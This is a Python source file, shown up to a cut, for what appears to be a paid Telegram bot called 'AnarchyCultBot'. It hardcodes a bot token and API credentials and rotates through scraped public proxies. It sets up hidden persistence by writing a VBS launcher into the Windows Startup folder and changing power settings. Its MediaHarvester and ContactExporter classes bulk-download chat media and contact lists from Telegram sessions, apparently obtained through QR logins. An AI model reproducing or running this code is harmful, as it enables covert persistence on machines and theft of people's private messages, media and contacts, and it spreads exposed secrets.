import asyncio
import ctypes
import html
import io
import json
import os
import random
import re
import shutil
import socket
import sqlite3
import subprocess
import sys
import time
import traceback
import zipfile
import base64
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs
import httpx
import qrcode
from telethon import TelegramClient, functions, errors
from telethon.network.connection import ConnectionTcpMTProxyRandomizedIntermediate
from telethon.sessions import StringSession
from telethon.tl.types import User
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    CallbackQueryHandler,
    filters,
)
from telegram.error import NetworkError, RetryAfter, TimedOut, BadRequest, TelegramError
from telegram.request import HTTPXRequest
from python_socks import ProxyType

try:
    import socksio  # noqa
    HAS_SOCKSIO = True
except ImportError:
    HAS_SOCKSIO = False

SCRIPT_DIR = os.path.dirname(os.path.abspath(sys.argv[0]))
os.chdir(SCRIPT_DIR)

API_ID = 24835154
API_HASH = "e7c35ab96f8d8f76513fd7a3ae242c3b"
SESSIONS_DIR = "sessions"
CACHE_FILE = "proxies.json"
DB_FILE = "bot_data.db"
MAX_MULTI = 10
CONNECT_TIMEOUT = 15.0
WATCHDOG_INTERVAL = 60
DEFAULT_QR_TIMEOUT = 240
PROXY_TTL = 7200
MAX_USER_PROXIES = 5

BOT_TOKEN = "8699376430:AAFvHBkHV-Jqc4pNgst1FLpbhVsuSN7VBBk"
ADMIN_ID = 5508984484
BUY_CONTACT = "@core_cult"
BUY_LINK = "http://t.me/anonaskbot?start=sn7jglr"

def _log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)

def _mtproxy_secret_to_hex(secret: str):
    s = (secret or "").strip()
    if not s:
        return "", "mtproto"
    if s[:2].lower() == "ee":
        return s.lower(), "mtproto_faketls"
    if re.fullmatch(r"[0-9a-fA-F]+", s) and len(s) in (32, 34):
        return s.lower(), "mtproto"
    try:
        raw = base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
        if len(raw) >= 16:
            return raw.hex(), ("mtproto_faketls" if raw[:1] == b"\xee" else "mtproto")
    except Exception:
        pass
    return s, "mtproto"

_CUSTOM_SECRET_HEX, _CUSTOM_SECRET_TYPE = _mtproxy_secret_to_hex("7t_3-AGR8VrTsHigqGns4-Fvay5ydQ")

CUSTOM_MT_PROXY = {
    "type": _CUSTOM_SECRET_TYPE,
    "server": "168.80.201.101",
    "port": 443,
    "secret": _CUSTOM_SECRET_HEX,
}

STATIC_MT_PROXIES = [
    dict(CUSTOM_MT_PROXY),
    {"type": "mtproto_faketls", "server": "x.shmelproxy.top", "port": 443, "secret": "eefc2612ff65a557fddf1d1b334395ef237975672d6c696e6b2e7275"},
    {"type": "mtproto_faketls", "server": "miniproxy.space", "port": 443, "secret": "eedaf193c17a8d271b4f2037dba3e1c74f6d696e6970726f78792e7370616365"},
    {"type": "mtproto_faketls", "server": "Hel-hi.co.uk.", "port": 443, "secret": "eef0eeb0bd9adc4fd4a93994ee3b2a216b63646e2e79656b74616e65742e636f6d"},
    {"type": "mtproto", "server": "Lashboy.muzanesghy.co.uk", "port": 4455, "secret": "dd104462821249bd7ac519130220c25d09"},
    {"type": "mtproto", "server": "mizaneshgh2.co.uk", "port": 4455, "secret": "dd104462821249bd7ac519130220c25d09"},
    {"type": "mtproto", "server": "new7.mizanmizanesgh.co.uk", "port": 4455, "secret": "dd104462821249bd7ac519130220c25d09"},
    {"type": "mtproto_faketls", "server": "beest-sellerst.co.uk.", "port": 443, "secret": "eef0eeb0bd9adc4fd4a93994ee3b2a216b63646e2e79656b74616e65742e636f6d"},
    {"type": "mtproto", "server": "ffastdomain-eu.com", "port": 443, "secret": "afdc38b8068b2444e50f6a4f093751b5"},
]

SOURCES_SOCKS5 = [
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/gfpcom/free-proxy-list/main/lists/socks5.txt",
    "https://raw.githubusercontent.com/Argh94/Proxy-List/main/socks5.txt",
    "https://raw.githubusercontent.com/74647/proxify/main/telegram_proxies/socks5.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1225/Free-Proxy-List/main/socks5.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/Telegram/socks5.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks5.txt",
]

SOURCES_MT = [
    "https://raw.githubusercontent.com/SoliSpirit/mtproto/master/all_proxies.txt",
    "https://raw.githubusercontent.com/Grim1313/mtproto-for-telegram/master/all_proxies.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/MTProtoProxy/main/mtproto.txt",
    "https://tgmtproxy.github.io/mtproxy/proxies.txt",
    "https://raw.githubusercontent.com/Yagami200/free-mtproto-proxies/main/proxies.txt",
    "https://raw.githubusercontent.com/74647/proxify/main/telegram_proxies/mtproto.txt",
    "https://raw.githubusercontent.com/MhdiTaheri/ProxyCollector/main/proxy.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/mtproto.txt",
    "https://raw.githubusercontent.com/roosterkid/openern/main/MTProto.txt",
    "https://raw.githubusercontent.com/MrPooyaX/MtpProxy/main/data.txt",
    "https://raw.githubusercontent.com/Everyday-Tools/MTProto-Proxy-List/main/mtproto.txt",
    "https://raw.githubusercontent.com/TelegramMTProto/ProxyList/main/proxies.txt",
    "https://raw.githubusercontent.com/MaurizioRicci/MTProtoProxy/master/mtproto.txt",
]

SOURCES = SOURCES_SOCKS5 + SOURCES_MT

active_proxies = []
current_proxy = None
ptb_current_proxy = None
raw_proxy_pool = []
checked_index = 0
is_replenishing = False
force_direct = False

ES_CONTINUOUS = 0x80000000
ES_SYSTEM_REQUIRED = 0x00000001
ES_DISPLAY_REQUIRED = 0x00000002

_HTTPX_NET_ERRORS = (
    httpx.ConnectError, httpx.ProxyError, httpx.ReadTimeout, httpx.ConnectTimeout,
    httpx.RemoteProtocolError, httpx.ReadError, httpx.WriteError, httpx.PoolTimeout, OSError,
)

def parse_mtproto_line(line: str):
    line = line.strip()
    if not line or line.startswith("#") or line.startswith("//"):
        return None
    if "tg://proxy" in line or "t.me/proxy" in line:
        try:
            qs = parse_qs(urlparse(line).query)
            server = qs.get("server", [None])[0]
            port = qs.get("port", [None])[0]
            secret = qs.get("secret", [None])[0]
            if server and port and secret:
                hex_secret, ptype = _mtproxy_secret_to_hex(secret)
                return {"type": ptype, "server": server.rstrip("."), "port": int(port), "secret": hex_secret}
        except Exception:
            return None
    parts = line.split(":")
    if len(parts) >= 3:
        server, port, secret = parts[0], parts[1], parts[2]
        try:
            hex_secret, ptype = _mtproxy_secret_to_hex(secret)
            return {"type": ptype, "server": server.rstrip("."), "port": int(port), "secret": hex_secret}
        except ValueError:
            return None
    return None

def parse_socks5_line(line: str):
    line = line.strip()
    if not line or line.startswith("#") or line.startswith("//"):
        return None
    if "://" in line:
        try:
            parsed = urlparse(line)
            host = parsed.hostname
            port = parsed.port
            if host and port:
                res = {"type": "socks5", "server": host, "port": port}
                if parsed.username and parsed.password:
                    res["username"] = parsed.username
                    res["password"] = parsed.password
                return res
        except Exception:
            return None
    parts = line.split(":")
    if len(parts) >= 2:
        host = parts[0]
        try:
            port = int(parts[1])
            res = {"type": "socks5", "server": host, "port": port}
            if len(parts) >= 4:
                res["username"] = parts[2]
                res["password"] = parts[3]
            return res
        except ValueError:
            return None
    return None

async def _fetch_urls(urls):
    found = []
    timeout = httpx.Timeout(6.0, connect=4.0)
    async with httpx.AsyncClient(timeout=timeout, follow_redirects=True) as client:
        for url in urls:
            try:
                resp = await client.get(url)
                if resp.status_code == 200:
                    for line in resp.text.splitlines():
                        line = line.strip()
                        if not line:
                            continue
                        p_mt = parse_mtproto_line(line)
                        if p_mt:
                            found.append(p_mt)
                            continue
                        p_socks = parse_socks5_line(line)
                        if p_socks:
                            found.append(p_socks)
            except Exception:
                continue
    return found

async def fetch_proxies(need_socks5=False):
    if need_socks5:
        socks_first = await _fetch_urls(SOURCES_SOCKS5)
        mt = await _fetch_urls(SOURCES_MT)
        return [dict(sp) for sp in STATIC_MT_PROXIES] + socks_first + mt
    all_found = await _fetch_urls(SOURCES)
    return [dict(sp) for sp in STATIC_MT_PROXIES] + all_found

async def check_mtproto(proxy: dict):
    try:
        start = time.time()
        reader, writer = await asyncio.wait_for(asyncio.open_connection(proxy["server"], proxy["port"]), timeout=3.0)
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        return time.time() - start
    except Exception:
        return None

async def check_socks5(proxy: dict):
    try:
        start = time.time()
        reader, writer = await asyncio.wait_for(asyncio.open_connection(proxy["server"], proxy["port"]), timeout=3.0)
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        tcp_latency = time.time() - start
    except Exception:
        return None

    if not HAS_SOCKSIO:
        return tcp_latency

    if "username" in proxy and "password" in proxy:
        proxy_url = f"socks5://{proxy['username']}:{proxy['password']}@{proxy['server']}:{proxy['port']}"
    else:
        proxy_url = f"socks5://{proxy['server']}:{proxy['port']}"
    try:
        async with httpx.AsyncClient(
            proxy=proxy_url, timeout=4.0, verify=False,
            limits=httpx.Limits(max_keepalive_connections=0, max_connections=1)
        ) as client:
            resp = await client.get("https://api.telegram.org")
            if resp.status_code in (200, 302, 404):
                return time.time() - start
    except Exception:
        pass
    return None

async def check_proxy(proxy: dict):
    if proxy["type"] in ("mtproto", "mtproto_faketls"):
        latency = await check_mtproto(proxy)
    else:
        latency = await check_socks5(proxy)
    if latency is not None:
        proxy["latency"] = latency
        return proxy
    return None

def _pool_has_socks5():
    return any(p.get("type") == "socks5" for p in active_proxies)

async def check_batch_from_pool(batch_target=10, types_filter=None):
    global raw_proxy_pool, checked_index
    valid = []
    need_socks5 = (types_filter == "socks5")
    if not raw_proxy_pool or checked_index >= len(raw_proxy_pool):
        raw_proxy_pool = await fetch_proxies(need_socks5=need_socks5)
        static_keys = {f"{sp['server']}:{sp['port']}" for sp in STATIC_MT_PROXIES}
        rest = [p for p in raw_proxy_pool if f"{p['server']}:{p['port']}" not in static_keys]
        if need_socks5:
            socks = [p for p in rest if p["type"] == "socks5"]
            non_socks = [p for p in rest if p["type"] != "socks5"]
            random.shuffle(socks)
            random.shuffle(non_socks)
            rest = socks + non_socks
        else:
            random.shuffle(rest)
        raw_proxy_pool = [dict(sp) for sp in STATIC_MT_PROXIES] + rest
        checked_index = 0
        if not raw_proxy_pool:
            return []
    chunk_size = 1000
    sem = asyncio.Semaphore(100)
    async def sem_check(p):
        async with sem:
            try:
                return await asyncio.wait_for(check_proxy(p), timeout=3.5)
            except Exception:
                return None
    while len(valid) < batch_target and checked_index < len(raw_proxy_pool):
        chunk = raw_proxy_pool[checked_index:checked_index+chunk_size]
        checked_index += chunk_size
        tasks = [asyncio.create_task(sem_check(p)) for p in chunk]
        pending = set(tasks)
        while pending and len(valid) < batch_target:
            done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
            for t in done:
                if t.cancelled() or t.exception() is not None:
                    continue
                res = t.result()
                if not res:
                    continue
                if types_filter == "socks5" and res["type"] != "socks5":
                    continue
                valid.append(res)
                if len(valid) >= batch_target:
                    break
        for t in pending:
            t.cancel()
    return valid

def _inject_static_proxies():
    global active_proxies
    existing = {f"{p['server']}:{p['port']}" for p in active_proxies}
    to_add = []
    for sp in STATIC_MT_PROXIES:
        key = f"{sp['server']}:{sp['port']}"
        if key not in existing:
            to_add.append(dict(sp))
            existing.add(key)
    if to_add:
        active_proxies = to_add + active_proxies

async def replenish_proxies():
    global active_proxies, is_replenishing, force_direct
    if is_replenishing:
        return
    if len(active_proxies) >= 10 and _pool_has_socks5():
        return
    is_replenishing = True
    try:
        new_proxies = []
        if not _pool_has_socks5():
            socks5 = await check_batch_from_pool(5, types_filter="socks5")
            new_proxies.extend(socks5)
        remaining = max(10 - len(active_proxies) - len(new_proxies), 0)
        if remaining > 0:
            others = await check_batch_from_pool(remaining)
            new_proxies.extend(others)
        if new_proxies:
            active_proxies.extend(new_proxies)
            active_proxies = list({f"{p['server']}:{p['port']}": p for p in active_proxies}.values())
            active_proxies.sort(key=lambda x: x.get("latency", 999))
            force_direct = False
            _inject_static_proxies()
            try:
                with open(CACHE_FILE, "w", encoding="utf-8") as f:
                    json.dump(active_proxies, f)
            except Exception:
                pass
        else:
            _inject_static_proxies()
    finally:
        is_replenishing = False

async def load_or_refresh_proxies(force=False):
    global active_proxies, force_direct
    force_direct = False
    _log("Загрузка прокси...")
    if not force and os.path.exists(CACHE_FILE):
        try:
            if time.time() - os.path.getmtime(CACHE_FILE) > PROXY_TTL:
                force = True
            else:
                with open(CACHE_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
                if isinstance(data, list) and len(data) >= 3:
                    valid_cache = []
                    sem = asyncio.Semaphore(20)
                    async def cache_check(p):
                        async with sem:
                            return await check_proxy(p)
                    tasks = [asyncio.create_task(cache_check(p)) for p in data]
                    done, _ = await asyncio.wait(tasks, timeout=4.0)
                    for t in done:
                        if t.cancelled() or t.exception() is not None:
                            continue
                        res = t.result()
                        if res:
                            valid_cache.append(res)
                    if valid_cache:
                        valid_cache.sort(key=lambda x: x.get("latency", 999))
                        active_proxies = valid_cache
                        _inject_static_proxies()
                        _log(f"Кеш прокси: {len(active_proxies)} живых")
                        return
                    else:
                        force = True
        except Exception:
            pass
        try:
            os.remove(CACHE_FILE)
        except Exception:
            pass
    active_proxies = await check_batch_from_pool(15)
    if not _pool_has_socks5():
        extra = await check_batch_from_pool(5, types_filter="socks5")
        if extra:
            active_proxies.extend(extra)
    if active_proxies:
        active_proxies = list({f"{p['server']}:{p['port']}": p for p in active_proxies}.values())
        active_proxies.sort(key=lambda x: x.get("latency", 999))
        _inject_static_proxies()
        try:
            with open(CACHE_FILE, "w", encoding="utf-8") as f:
                json.dump(active_proxies, f)
        except Exception:
            pass
    else:
        active_proxies = [dict(sp) for sp in STATIC_MT_PROXIES]
        force_direct = False
    _log(f"Прокси в пуле: {len(active_proxies)} (socks5: {sum(1 for p in active_proxies if p.get('type')=='socks5')})")

def get_fast_proxy():
    if not active_proxies:
        return None
    top_tier = active_proxies[:max(1, len(active_proxies) // 3)]
    return random.choice(top_tier)

def get_active_proxy():
    global current_proxy
    if not active_proxies:
        return None
    if current_proxy is None or current_proxy not in active_proxies:
        remaining_tier = active_proxies[max(1, len(active_proxies) // 3):]
        if not remaining_tier:
            remaining_tier = active_proxies
        current_proxy = random.choice(remaining_tier)
    return current_proxy

def rotate_proxy():
    global current_proxy
    if not active_proxies:
        return None
    old = current_proxy
    remaining_tier = active_proxies[max(1, len(active_proxies) // 3):]
    if not remaining_tier:
        remaining_tier = active_proxies
    while current_proxy == old and len(remaining_tier) > 1:
        current_proxy = random.choice(remaining_tier)
    return current_proxy

def get_ptb_proxy():
    global ptb_current_proxy
    socks_proxies = [p for p in active_proxies if p["type"] == "socks5"]
    if not socks_proxies:
        ptb_current_proxy = None
        return None
    if ptb_current_proxy is None or ptb_current_proxy not in socks_proxies:
        ptb_current_proxy = random.choice(socks_proxies)
    return ptb_current_proxy

def rotate_ptb_proxy():
    global ptb_current_proxy
    socks_proxies = [p for p in active_proxies if p["type"] == "socks5"]
    if not socks_proxies:
        ptb_current_proxy = None
        return None
    old = ptb_current_proxy
    pool = [p for p in socks_proxies if p != old] or socks_proxies
    ptb_current_proxy = random.choice(pool)
    return ptb_current_proxy

def purge_dead_proxy(proxy):
    global active_proxies, current_proxy, ptb_current_proxy
    if proxy in active_proxies:
        active_proxies.remove(proxy)
    if current_proxy == proxy:
        current_proxy = None
    if ptb_current_proxy == proxy:
        ptb_current_proxy = None
    try:
        with open(CACHE_FILE, "w", encoding="utf-8") as f:
            json.dump(active_proxies, f)
    except Exception:
        pass
    if len(active_proxies) < 5 or not _pool_has_socks5():
        asyncio.create_task(replenish_proxies())

def _ptb_proxy_url(p):
    if not p:
        return None
    if "username" in p and "password" in p:
        return f"socks5://{p['username']}:{p['password']}@{p['server']}:{p['port']}"
    return f"socks5://{p['server']}:{p['port']}"

class RotatingHTTPXRequest(HTTPXRequest):
    async def _rebuild_client(self, proxy=None):
        try:
            await self._client.aclose()
        except Exception:
            pass
        timeout = httpx.Timeout(10.0, connect=6.0)
        url = _ptb_proxy_url(proxy)
        if url and HAS_SOCKSIO:
            try:
                self._client = httpx.AsyncClient(proxy=url, timeout=timeout, verify=False)
                return
            except Exception:
                pass
        self._client = httpx.AsyncClient(timeout=timeout, verify=False)

    async def do_request(self, *args, **kwargs):
        try:
            return await super().do_request(*args, **kwargs)
        except _HTTPX_NET_ERRORS as first_exc:
            last_exc = first_exc
        except Exception:
            raise

        p = get_ptb_proxy()
        if p:
            purge_dead_proxy(p)
        rotate_ptb_proxy()
        await self._rebuild_client(get_ptb_proxy())

        try:
            return await super().do_request(*args, **kwargs)
        except _HTTPX_NET_ERRORS as second_exc:
            last_exc = second_exc
        except Exception:
            raise

        try:
            await self._rebuild_client(None)
            return await super().do_request(*args, **kwargs)
        except _HTTPX_NET_ERRORS as direct_exc:
            last_exc = direct_exc

        if not _pool_has_socks5():
            asyncio.create_task(replenish_proxies())
        raise NetworkError(f"All connection attempts failed: {last_exc!r}")

def build_ptb_request():
    p = get_ptb_proxy()
    timeout = 10.0
    if p and HAS_SOCKSIO:
        url = _ptb_proxy_url(p)
        try:
            return RotatingHTTPXRequest(proxy=url, timeout=timeout)
        except Exception:
            pass
    return RotatingHTTPXRequest(timeout=timeout)

def _secret_to_bytes(secret: str) -> bytes:
    s = (secret or "").strip()
    if not s:
        return b""
    if re.fullmatch(r"[0-9a-fA-F]+", s) and len(s) % 2 == 0 and len(s) >= 32:
        try:
            return bytes.fromhex(s)
        except Exception:
            pass
    if re.fullmatch(r"[A-Za-z0-9_\-=]+", s) and len(s) >= 20:
        try:
            padded = s + "=" * (-len(s) % 4)
            raw = base64.urlsafe_b64decode(padded)
            if len(raw) >= 16:
                return raw
        except Exception:
            pass
    return s.encode()

def build_client(session, fast=False, user_proxy=None) -> TelegramClient:
    global force_direct
    p = None
    if user_proxy:
        p = user_proxy
    elif force_direct:
        return TelegramClient(session, API_ID, API_HASH, timeout=15.0)
    else:
        p = get_fast_proxy() if fast else get_active_proxy()
    if not p:
        return TelegramClient(session, API_ID, API_HASH, timeout=CONNECT_TIMEOUT)
    if p["type"] in ("mtproto", "mtproto_faketls"):
        sec_bytes = _secret_to_bytes(p["secret"])
        return TelegramClient(
            session, API_ID, API_HASH,
            connection=ConnectionTcpMTProxyRandomizedIntermediate,
            proxy=(p["server"], p["port"], sec_bytes),
            timeout=CONNECT_TIMEOUT
        )
    elif p["type"] == "socks5":
        if "username" in p and "password" in p:
            return TelegramClient(
                session, API_ID, API_HASH,
                proxy=dict(proxy_type=ProxyType.SOCKS5, addr=p["server"], port=p["port"], username=p["username"], password=p["password"], rdns=True),
                timeout=CONNECT_TIMEOUT
            )
        else:
            return TelegramClient(
                session, API_ID, API_HASH,
                proxy=dict(proxy_type=ProxyType.SOCKS5, addr=p["server"], port=p["port"], rdns=True),
                timeout=CONNECT_TIMEOUT
            )
    return TelegramClient(session, API_ID, API_HASH, timeout=CONNECT_TIMEOUT)

class BackgroundEngine:
    @staticmethod
    def setup():
        try:
            subprocess.run(["powercfg", "/setacvalueindex", "SCHEME_CURRENT", "SUB_BUTTONS", "LIDACTION", "0"], capture_output=True)
            subprocess.run(["powercfg", "/setdcvalueindex", "SCHEME_CURRENT", "SUB_BUTTONS", "LIDACTION", "0"], capture_output=True)
            subprocess.run(["powercfg", "/setactive", "SCHEME_CURRENT"], capture_output=True)
        except Exception:
            pass
        try:
            startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            vbs_path = os.path.join(startup_dir, "AnarchyCultBot.vbs")
            script_path = os.path.abspath(sys.argv[0])
            pythonw_path = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
            if "pythonw" not in sys.executable.lower() and not os.path.exists(vbs_path):
                vbs_content = f'Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run Chr(34) & "{pythonw_path}" & Chr(34) & " " & Chr(34) & "{script_path}" & Chr(34), 0\nSet WshShell = Nothing'
                with open(vbs_path, "w", encoding="utf-8") as f:
                    f.write(vbs_content)
        except Exception:
            pass

class WinSleepBlocker:
    def __init__(self):
        self.is_blocked = False
    def block(self):
        if sys.platform == "win32" and not self.is_blocked:
            try:
                ctypes.windll.kernel32.SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED)
                self.is_blocked = True
            except Exception:
                pass
    def unblock(self):
        if sys.platform == "win32" and self.is_blocked:
            try:
                ctypes.windll.kernel32.SetThreadExecutionState(ES_CONTINUOUS)
                self.is_blocked = False
            except Exception:
                pass

def db_init():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        joined_at TEXT,
        sub_until TEXT,
        trial_used INTEGER DEFAULT 0,
        sub_type INTEGER DEFAULT 0,
        ref_count INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        action TEXT,
        timestamp TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_proxies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        type TEXT NOT NULL,
        server TEXT NOT NULL,
        port INTEGER NOT NULL,
        secret TEXT,
        username TEXT,
        password TEXT,
        label TEXT,
        created_at TEXT
    )''')
    c.execute("PRAGMA table_info(users)")
    columns = [info[1] for info in c.fetchall()]
    for col, ddl in [
        ("joined_at", "ALTER TABLE users ADD COLUMN joined_at TEXT"),
        ("sub_until", "ALTER TABLE users ADD COLUMN sub_until TEXT"),
        ("trial_used", "ALTER TABLE users ADD COLUMN trial_used INTEGER DEFAULT 0"),
        ("sub_type", "ALTER TABLE users ADD COLUMN sub_type INTEGER DEFAULT 0"),
        ("ref_count", "ALTER TABLE users ADD COLUMN ref_count INTEGER DEFAULT 0"),
    ]:
        if col not in columns:
            c.execute(ddl)
    conn.commit()
    conn.close()

def get_setting(key, default):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT value FROM settings WHERE key=?", (key,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else default

def set_setting(key, value):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, str(value)))
    conn.commit()
    conn.close()

def get_qr_timeout():
    try:
        return int(get_setting("qr_timeout", DEFAULT_QR_TIMEOUT))
    except ValueError:
        return DEFAULT_QR_TIMEOUT

def register_user(user_id, username="", first_name=""):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id, username, first_name, joined_at) VALUES (?, ?, ?, ?)",
              (user_id, username or "", first_name or "", datetime.now().isoformat()))
    conn.commit()
    conn.close()

def log_action(user_id, action):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO history (user_id, action, timestamp) VALUES (?, ?, ?)",
              (user_id, action, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_user_data(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT sub_until, trial_used, sub_type, ref_count FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row if row else (None, 0, 0, 0)

def set_trial_used(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET trial_used = 1 WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()

def add_ref_time(user_id, minutes):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT sub_until, sub_type FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    if not row:
        conn.close()
        return
    sub_until, sub_type = row
    now = datetime.now()
    if sub_until:
        try:
            dt = datetime.fromisoformat(sub_until)
            new_until = dt + timedelta(minutes=minutes) if dt > now else now + timedelta(minutes=minutes)
        except Exception:
            new_until = now + timedelta(minutes=minutes)
    else:
        new_until = now + timedelta(minutes=minutes)
    new_type = 2 if sub_type == 2 else 1
    c.execute("UPDATE users SET sub_until = ?, sub_type = ?, ref_count = ref_count + 1 WHERE user_id = ?",
              (new_until.isoformat(), new_type, user_id))
    conn.commit()
    conn.close()

def has_sub(user_id):
    if user_id == ADMIN_ID:
        return True
    sub_until, _, _, _ = get_user_data(user_id)
    if sub_until:
        try:
            return datetime.now() < datetime.fromisoformat(sub_until)
        except Exception:
            pass
    return False

def has_paid_sub(user_id):
    if user_id == ADMIN_ID:
        return True
    sub_until, _, sub_type, _ = get_user_data(user_id)
    if sub_until and sub_type == 2:
        try:
            return datetime.now() < datetime.fromisoformat(sub_until)
        except Exception:
            pass
    return False

def get_sub_info(user_id):
    if user_id == ADMIN_ID:
        return " Бессрочно (Админ)"
    sub_until, trial_used, sub_type, _ = get_user_data(user_id)
    if sub_until:
        try:
            dt = datetime.fromisoformat(sub_until)
            if datetime.now() < dt:
                diff = dt - datetime.now()
                days = diff.days
                hours, remainder = divmod(diff.seconds, 3600)
                minutes, _ = divmod(remainder, 60)
                if sub_type == 2:
                    return f"✅ Полная подписка (до {dt.strftime('%Y-%m-%d %H:%M')})\nОсталось: {days} д. {hours} ч. {minutes} м."
                return f"⚠️ Реферальная подписка (до {dt.strftime('%Y-%m-%d %H:%M')})\nОсталось: {days} д. {hours} ч. {minutes} м."
        except Exception:
            pass
    if not trial_used:
        return " Доступен пробный период (1 раз)"
    return "❌ Нет активной подписки"

def _user_proxy_key(p: dict) -> str:
    return f"{p.get('type')}://{p.get('server')}:{p.get('port')}"

def _row_to_proxy(row) -> dict:
    return {
        "id": row[0], "type": row[1], "server": row[2], "port": row[3],
        "secret": row[4], "username": row[5], "password": row[6], "label": row[7],
    }

def list_user_proxies(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, type, server, port, secret, username, password, label FROM user_proxies WHERE user_id=? ORDER BY id DESC", (user_id,))
    rows = c.fetchall()
    conn.close()
    return [_row_to_proxy(r) for r in rows]

def get_user_proxy_by_id(user_id, pid):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, type, server, port, secret, username, password, label FROM user_proxies WHERE user_id=? AND id=?", (user_id, pid))
    row = c.fetchone()
    conn.close()
    return _row_to_proxy(row) if row else None

def add_user_proxy(user_id, proxy: dict, label: str = "") -> int:
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM user_proxies WHERE user_id=?", (user_id,))
    if c.fetchone()[0] >= MAX_USER_PROXIES:
        conn.close()
        return -1
    c.execute("""INSERT INTO user_proxies (user_id, type, server, port, secret, username, password, label, created_at)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
              (user_id, proxy["type"], proxy["server"], proxy["port"],
               proxy.get("secret"), proxy.get("username"), proxy.get("password"),
               label, datetime.now().isoformat()))
    pid = c.lastrowid
    conn.commit()
    conn.close()
    return pid

def delete_user_proxy(user_id, pid) -> bool:
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM user_proxies WHERE user_id=? AND id=?", (user_id, pid))
    conn.commit()
    affected = c.rowcount
    conn.close()
    return affected > 0

def parse_user_proxy_input(text: str):
    t = text.strip()
    if not t:
        return None
    return parse_mtproto_line(t) or parse_socks5_line(t)

class MediaHarvester:
    def __init__(self, base_dir: str = "harvested") -> None:
        self.base_dir = base_dir
        os.makedirs(self.base_dir, exist_ok=True)
    async def harvest_chat_media(self, client: TelegramClient, entity, limit: int):
        results = []
        chat_dir = os.path.join(self.base_dir, str(entity.id))
        os.makedirs(chat_dir, exist_ok=True)
        async for message in client.iter_messages(entity, limit=limit):
            if not message.media:
                continue
            try:
                path = await message.download_media(file=chat_dir)
                if path:
                    results.append({
                        "path": path,
                        "message_id": message.id,
                        "date": message.date.isoformat() if message.date else None,
                    })
            except Exception:
                continue
        return results

class ContactExporter:
    def __init__(self, base_dir: str = "exports") -> None:
        self.base_dir = base_dir
        os.makedirs(self.base_dir, exist_ok=True)
    async def export_contacts(self, client: TelegramClient):
        import csv
        result = await client(functions.contacts.GetContactsRequest(hash=0))
        users = [u for u in result.users if isinstance(u, User)]
        stamp = int(time.time())
        json_path = os.path.join(self.base_dir, f"contacts_{stamp}.json")
        csv_path = os.path.join(self.base_dir, f"contacts_{stamp}.csv")
        rows = [{
            "id": u.id, "username": u.username or "", "first_name": u.first_name or "",
